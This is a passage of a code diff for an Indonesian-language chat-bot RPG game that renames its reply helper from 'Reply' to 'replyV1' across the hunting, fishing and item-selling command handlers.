-      if (!global.db.erpg[m.sender].rpg) return Reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
-      if (global.db.erpg[m.sender].darahuser < 1) return Reply('Kamu Lemah, Silahkan Sembuhkan Menggunakan Ramuan/Makanan\n\nKetik _.heal_')
-      if (global.db.erpg[m.sender].stamina < 1) return Reply(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
+      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
+      if (global.db.erpg[m.sender].darahuser < 1) return replyV1('Kamu Lemah, Silahkan Sembuhkan Menggunakan Ramuan/Makanan\n\nKetik _.heal_')
+      if (global.db.erpg[m.sender].stamina < 1) return replyV1(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
       var tuju = args.join(" ")
       let obj = ["villager", "zombie", "ghasts", "wither", "skeleton", "wolves"]
       let obje = await pickRandom(obj)
@@ -20013,8 +19986,8 @@ _berburu berikutnya_`)
     case 'memancing':
     case 'mancing': {
 
-      if (!global.db.erpg[m.sender].rpg) return Reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
-      if (global.db.erpg[m.sender].stamina < 1) return Reply('Stamina Lemah, Silahkan Sembuhkan Menggunakan Ramuan/Makanan')
+      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
+      if (global.db.erpg[m.sender].stamina < 1) return replyV1('Stamina Lemah, Silahkan Sembuhkan Menggunakan Ramuan/Makanan')
       let ikan = await randomNomor(0, 20)
       let ikangurita = await randomNomor(0, 15)
       let ikancumi = await randomNomor(0, 13)
@@ -20083,20 +20056,20 @@ _Stamina berkurang -20_`
     case 'sell':
     case 'jual': {
 
-      if (!global.db.erpg[m.sender].rpg) return Reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
-      if (text.includes('-')) return Reply('Nominal Tidak valid!!');
+      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
+      if (text.includes('-')) return replyV1('Nominal Tidak valid!!');
       let jual = args[0]
       switch (jual) {
       case 'emas': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 20500)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].emas}` < `${jumlh}`) return Reply(`*Emas Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].emas}` < `${jumlh}`) return replyV1(`*Emas Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].emas -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Emas: ${args[1]}
@@ -20110,14 +20083,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'besi': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 1500)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].besi}` < `${jumlh}`) return Reply(`*Besi Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].besi}` < `${jumlh}`) return replyV1(`*Besi Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].besi -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Besi: ${args[1]}
@@ -20131,14 +20104,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'batubara': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 1000)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].batubara}` < `${jumlh}`) return Reply(`*Batu Bara Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].batubara}` < `${jumlh}`) return replyV1(`*Batu Bara Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].batubara -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Batu Bara: ${args[1]}
@@ -20152,14 +20125,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'perak': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 2000)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].perak}` < `${jumlh}`) return Reply(`*Perak Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].perak}` < `${jumlh}`) return replyV1(`*Perak Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].perak -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Perak: ${args[1]}
@@ -20173,14 +20146,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'kayu': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 500)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].kayu}` < `${jumlh}`) return Reply(`*Kayu Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].kayu}` < `${jumlh}`) return replyV1(`*Kayu Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].kayu -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Kayu: ${args[1]}
@@ -20194,14 +20167,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'ayam': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 500)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].ayam}` < `${jumlh}`) return Reply(`*Ayam Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].ayam}` < `${jumlh}`) return replyV1(`*Ayam Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].ayam -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Ayam: ${args[1]}
@@ -20215,14 +20188,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'sapi': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 3000)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].sapi}` < `${jumlh}`) return Reply(`*Sapi Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].sapi}` < `${jumlh}`) return replyV1(`*Sapi Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].sapi -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Sapi: ${args[1]}
@@ -20236,14 +20209,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'domba': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 2000)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].domba}` < `${jumlh}`) return Reply(`*Domba Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].domba}` < `${jumlh}`) return replyV1(`*Domba Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].domba -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Domba: ${args[1]}
@@ -20257,14 +20230,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'ikan': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 200)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].ikan}` < `${jumlh}`) return Reply(`*Ikan Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].ikan}` < `${jumlh}`) return replyV1(`*Ikan Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].ikan -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Ikan: ${args[1]}
@@ -20278,14 +20251,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'rumah': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 200000)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].rumah}` < `${jumlh}`) return Reply(`*Rumah Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].rumah}` < `${jumlh}`) return replyV1(`*Rumah Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].rumah -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • rumah: ${args[1]}
@@ -20299,14 +20272,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'emerald': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 20000)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].emerald}` < `${jumlh}`) return Reply(`*Emerald Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].emerald}` < `${jumlh}`) return replyV1(`*Emerald Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].emerald -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Emerald: ${args[1]}
@@ -20320,14 +20293,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'diamond': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 50000)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].diamond}` < `${jumlh}`) return Reply(`*Diamond Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].diamond}` < `${jumlh}`) return replyV1(`*Diamond Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].diamond -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Diamond: ${args[1]}
@@ -20341,14 +20314,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'botol': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 200)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].botol}` < `${jumlh}`) return Reply(`*Botol Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].botol}` < `${jumlh}`) return replyV1(`*Botol Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].botol -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Botol: ${args[1]}
@@ -20362,14 +20335,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'kardus': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 200)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].kardus}` < `${jumlh}`) return Reply(`*Kardus Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].kardus}` < `${jumlh}`) return replyV1(`*Kardus Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].kardus -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Kardus: ${args[1]}
@@ -20383,14 +20356,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'kaleng': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 200)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].kaleng}` < `${jumlh}`) return Reply(`*Kaleng Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].kaleng}` < `${jumlh}`) return replyV1(`*Kaleng Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].kaleng -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Kaleng: ${args[1]}
@@ -20404,14 +20377,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'gelas': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 200)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].gelas}` < `${jumlh}`) return Reply(`*Gelas Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].gelas}` < `${jumlh}`) return replyV1(`*Gelas Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].gelas -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Gelas: ${args[1]}
@@ -20425,14 +20398,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'plastik': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 200)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].plastik}` < `${jumlh}`) return Reply(`*Plastik Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].plastik}` < `${jumlh}`) return replyV1(`*Plastik Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].plastik -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Plastik: ${args[1]}
@@ -20446,14 +20419,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'banteng': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 30000)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].banteng}` < `${jumlh}`) return Reply(`*Banteng Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].banteng}` < `${jumlh}`) return replyV1(`*Banteng Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].banteng -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Banteng: ${args[1]}
@@ -20467,14 +20440,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'gajah': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 70000)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].gajah}` < `${jumlh}`) return Reply(`*Gajah Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].gajah}` < `${jumlh}`) return replyV1(`*Gajah Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].gajah -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Gajah: ${args[1]}
@@ -20488,14 +20461,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'harimau': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 100000)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].harimau}` < `${jumlh}`) return Reply(`*Harimau Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].harimau}` < `${jumlh}`) return replyV1(`*Harimau Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].harimau -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Harimau: ${args[1]}
@@ -20509,14 +20482,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'kambing': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 30000)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].kambing}` < `${jumlh}`) return Reply(`*Kambing Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].kambing}` < `${jumlh}`) return replyV1(`*Kambing Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].kambing -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Kambing: ${args[1]}
@@ -20530,14 +20503,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'panda': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 40000)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].panda}` < `${jumlh}`) return Reply(`*Panda Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].panda}` < `${jumlh}`) return replyV1(`*Panda Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].panda -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Panda: ${args[1]}
@@ -20551,14 +20524,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'buaya': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 20000)
         let jumlh = Number(args[1])
-        if (`${global.db.erpg[m.sender].buaya}` < `${jumlh}`) return Reply(`*Buaya Kamu Tidak Cukup*`)
+        if (`${global.db.erpg[m.sender].buaya}` < `${jumlh}`) return replyV1(`*Buaya Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].buaya -= parseInt(args[1])
-        Reply(`*MARKET - JUAL🛍️*
+        replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Buaya: ${args[1]}
@@ -20572,14 +20545,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'kerbau': {
 
